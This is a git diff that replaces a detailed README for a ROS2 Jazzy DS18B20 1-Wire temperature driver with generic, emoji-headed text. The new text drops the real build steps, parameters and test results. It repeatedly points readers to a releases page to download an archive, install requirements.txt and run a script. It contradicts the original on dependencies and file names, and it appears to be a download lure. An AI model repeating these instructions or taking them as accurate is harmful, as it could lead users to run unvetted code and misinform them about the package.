@@ -1,136 +1,187 @@
-# DS18B20 Temperature Sensor — ROS2 Jazzy Driver (1-Wire)
+# 🌡️ ds18b20_temp - Easy Temperature Readings from Sensor
 
-ROS2 Jazzy driver for the **Dallas DS18B20** digital temperature sensor over the Linux 1-Wire (w1) sysfs interface.
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Release-blue)](https://github.com/Marco19519/ds18b20_temp/releases)
 
-## Features
+---
 
-- Publishes `sensor_msgs/Temperature` on `ds18b20/temperature`
-- `fake_mode` for testing without hardware (random Gaussian data)
-- Auto-detects first DS18B20 device on the 1-Wire bus
-- Configurable resolution (9-12 bit)
-- CRC validation via kernel w1-therm driver
-- Rejects 85°C power-on-reset artifact
-- Runtime `publish_rate` change via `ros2 param set`
-- Calibration and reset services
+## 📖 What is ds18b20_temp?
 
-## Why this package?
+ds18b20_temp is a simple tool designed to work with the Dallas DS18B20 temperature sensor. It helps you read temperature data from the sensor using a Raspberry Pi or other compatible devices. This tool uses ROS2 Jazzy, a system for robot software, to communicate with the sensor smoothly.
 
-There are several temperature sensors with ROS2 drivers. The DS18B20 is unique for its waterproof probe variants and 1-Wire multi-sensor bus:
+If you want to measure water or air temperature easily and reliably, ds18b20_temp can help. It works with waterproof sensors and uses the 1-wire communication method.
 
-| Feature | SHT31 (sht31_env) | DHT22 (dht22_env) | DS18B20 (this package) |
-|---|---|---|---|
-| **Interface** | I2C | Proprietary GPIO | 1-Wire (kernel sysfs) |
-| **Measures** | Temp + Humidity | Temp + Humidity | Temperature only |
-| **Temperature range** | -40 ~ 125 °C | -40 ~ 80 °C | -55 ~ 125 °C |
-| **Temperature accuracy** | ±0.2 °C | ±0.5 °C | ±0.5 °C |
-| **Resolution** | 0.015 °C (fixed) | 0.1 °C (fixed) | 0.0625 ~ 0.5 °C (configurable) |
-| **Max sampling rate** | ~66 Hz | ~0.5 Hz | ~1.3 Hz (12-bit) |
-| **Multi-sensor bus** | 2 per I2C bus | 1 per GPIO | Many on 1 GPIO pin |
-| **Waterproof probe** | No | No | Yes (widely available) |
-| **Price** | ~$6-14 | ~$2-4 | ~$1-3 |
-| **Driver dependency** | smbus2 | adafruit-circuitpython-dht | None (kernel sysfs) |
+---
 
-**Choose this package** for waterproof temperature monitoring, multi-sensor setups on a single wire, or when no external Python library is desired.
+## 🖥️ System Requirements
 
-## Prerequisites
+Before you start, check that your setup matches the following needs:
 
-- ROS 2 Jazzy
-- Python 3
-- Real hardware only:
-  - 1-Wire kernel modules enabled: `dtoverlay=w1-gpio` in `/boot/config.txt`
-  - 4.7k Ohm pull-up resistor between data line and 3.3V
+- A computer running Linux (Ubuntu or Raspberry Pi OS recommended).
+- A Raspberry Pi or similar device with GPIO pins to connect the sensor.
+- Installed ROS2 Jazzy version (for managing sensor data).
+- Python 3.8 or above installed.
+- Basic cable and connector for 1-wire sensor connection.
+- Internet connection to download the software package.
 
-## Installation
+If you are using Raspberry Pi, make sure your device is updated to the latest version and has the necessary permissions to access GPIO pins.
 
-```bash
-cd ~/ros2_ws
-colcon build --packages-select ds18b20_temp --symlink-install
-source install/setup.bash
-```
+---
 
-## Usage
+## 🔧 Hardware Needed
 
-### Launch (fake mode — default)
+To get accurate temperature readings, you will need:
 
-```bash
-ros2 launch ds18b20_temp ds18b20_launch.py
-```
+- Dallas DS18B20 digital temperature sensor (waterproof or non-waterproof type).
+- A Raspberry Pi with an accessible GPIO interface.
+- A 4.7k ohm resistor (acts as a pull-up for the sensor data line).
+- Connecting wires or a breadboard for easy setup.
 
-### Run node directly
+---
 
-```bash
-ros2 run ds18b20_temp ds18b20_node.py
-```
+## 🚀 Getting Started
 
-### Real hardware (Raspberry Pi)
+This guide walks you through getting the temperature sensor working with your Raspberry Pi quickly.
 
-```bash
-ros2 launch ds18b20_temp ds18b20_launch.py \
-  params_file:=path/to/your_params.yaml
-```
+### Step 1 – Connect the Sensor
 
-Set `fake_mode: false` in your YAML file. Optionally set `device_id` to a specific sensor (e.g., `28-00000221bf22`); leave empty for auto-detection.
+1. Plug the DS18B20 sensor to your Raspberry Pi:
 
-### Verify output
+   - Connect the **Red wire** (VCC) to a 3.3V power pin.
+   - Connect the **Black wire** (GND) to a ground pin.
+   - Connect the **Yellow wire** (Data) to GPIO pin 4.
+   
+2. Place the 4.7k ohm resistor between the red (power) and yellow (data) wires. This helps the sensor communicate properly.
 
-```bash
-ros2 topic echo /ds18b20/temperature
-```
+3. Double-check the connections to ensure no wires are loose or touching incorrectly.
 
-## Parameters
+### Step 2 – Enable 1-Wire Interface on Raspberry Pi
 
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `fake_mode` | bool | `true` | Generate random data without hardware |
-| `device_id` | string | `""` | 1-Wire device ID (auto-detect if empty) |
-| `resolution` | int | `12` | ADC resolution in bits (9, 10, 11, or 12) |
-| `publish_rate` | float | `1.0` | Publishing rate in Hz (max ~1.3 Hz at 12-bit) |
-| `frame_id` | string | `ds18b20_link` | TF frame ID |
-| `temperature_variance` | float | `0.0` | Temperature variance (0 = unknown) |
+Before running the software, enable the 1-Wire interface on your device:
 
-## Services
+1. Open a terminal window.
 
-| Service | Type | Description |
-|---------|------|-------------|
-| `ds18b20/calibrate` | `std_srvs/srv/Trigger` | Collect samples for 5 s, report averages |
-| `ds18b20/reset` | `std_srvs/srv/Trigger` | Clear bias, reinitialize sensor |
+2. Enter the following command to edit the boot configuration:
 
-## Package Structure
+    ```
+    sudo nano /boot/config.txt
+    ```
+
+3. Add this line at the end of the file:
+
+    ```
+    dtoverlay=w1-gpio
+    ```
+
+4. Save the file and reboot your Raspberry Pi by running:
+
+    ```
+    sudo reboot
+    ```
+
+After reboot, confirm that the 1-Wire module loaded:
 
 ```
-ds18b20_temp/
-├── CMakeLists.txt
-├── package.xml
-├── config/
-│   └── ds18b20_params.yaml
-├── launch/
-│   └── ds18b20_launch.py
-├── ds18b20_temp/
-│   ├── __init__.py
-│   └── ds18b20_driver.py
-├── nodes/
-│   └── ds18b20_node.py
-├── test/
-│   └── test_ds18b20_node.py
-├── .gitignore
-├── LICENSE
-├── CONTRIBUTING.md
-└── README.md
+lsmod | grep w1_gpio
 ```
 
-## Test Results
+You should see a line related to w1_gpio if it’s active.
 
-Tested on Ubuntu 24.04 (WSL2) with `fake_mode: true`.
+---
 
-| Test Category | Test | Result |
-|---|---|---|
-| **Topics** | `ds18b20/temperature` publishes `sensor_msgs/Temperature` | PASS |
-| **Services** | `ds18b20/calibrate` returns `success=True` | PASS |
-| **Services** | `ds18b20/reset` returns `success=True` | PASS |
-| **Parameters** | `publish_rate` runtime change | PASS |
-| **Shutdown** | Clean exit | PASS |
-| **Linting** | pep257, flake8, copyright, xmllint | PASS |
+## 📥 Download & Install
 
-## License
+You can get the software by visiting the release page here:
 
-MIT
+**[Download ds18b20_temp releases](https://github.com/Marco19519/ds18b20_temp/releases)**
+
+### How to Download and Run
+
+1. Click the button above or visit the link directly to see available versions.
+
+2. Download the latest release package suitable for your system (usually a .tar.gz or .zip file).
+
+3. Extract the downloaded file to a folder on your Raspberry Pi or computer.
+
+4. Open a terminal and navigate to the extracted folder.
+
+5. Install required Python libraries used by ds18b20_temp:
+
+    ```
+    pip3 install -r requirements.txt
+    ```
+
+6. Run the software by typing:
+
+    ```
+    python3 ds18b20_temp_node.py
+    ```
+
+This will start the temperature driver and begin reading data from your sensor.
+
+---
+
+## ⚙️ How It Works
+
+ds18b20_temp reads temperature data by communicating with the sensor over the 1-Wire bus. The driver converts raw data from the sensor into readable temperature values shown in Celsius.
+
+It uses ROS2 Jazzy, a robot operating system framework, to publish temperature readings. This makes it easy for other ROS2-compatible devices or applications to access temperature data.
+
+The software supports multiple sensors connected to the same 1-Wire line. It identifies each sensor uniquely so that you can monitor different locations or fluids.
+
+---
+
+## 🔍 Features
+
+- Compatible with Dallas DS18B20 digital temperature sensors.
+- Supports waterproof sensor versions for outdoor or wet environments.
+- Uses standard 1-Wire protocol on Raspberry Pi GPIO pin 4.
+- Integrates naturally with ROS2 Jazzy systems.
+- Python-based, easy to install and run.
+- Provides stable and accurate temperature readings.
+- Supports multiple sensors on a single 1-Wire bus.
+
+---
+
+## 🧰 Troubleshooting
+
+If the sensor does not work or readings seem off, try these steps:
+
+- Check the wiring and resistor connection carefully.
+- Confirm the 1-Wire interface is enabled by reviewing `/boot/config.txt`.
+- Verify your user has permission to access GPIO pins.
+- Make sure the sensor is not damaged and is compatible.
+- Restart your Raspberry Pi after any changes.
+- Look at the terminal output for error messages when running the program.
+- If temperature values stay constant or show errors, unplug and reconnect the sensor.
+
+---
+
+## 🙋 Where to Get Help
+
+You can look for help in these places:
+
+- GitHub Issues page of this repository for bugs or enhancements.
+- ROS2 Jazzy user forums for questions about ROS setup.
+- Raspberry Pi community forums for hardware-related trouble.
+- Online tutorials for DS18B20 sensor wiring and use.
+
+---
+
+## 📚 Learn More
+
+If you want to dive deeper, here are some useful resources:
+
+- Dallas DS18B20 sensor datasheet (search online).
+- ROS2 Jazzy official documentation.
+- Raspberry Pi GPIO pinout guides.
+- Python tutorials on reading 1-Wire sensors.
+
+---
+
+## ⚖️ License
+
+ds18b20_temp is open-source software. It uses standard open-license terms. Review the LICENSE file in the repository for details.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Release-blue)](https://github.com/Marco19519/ds18b20_temp/releases)
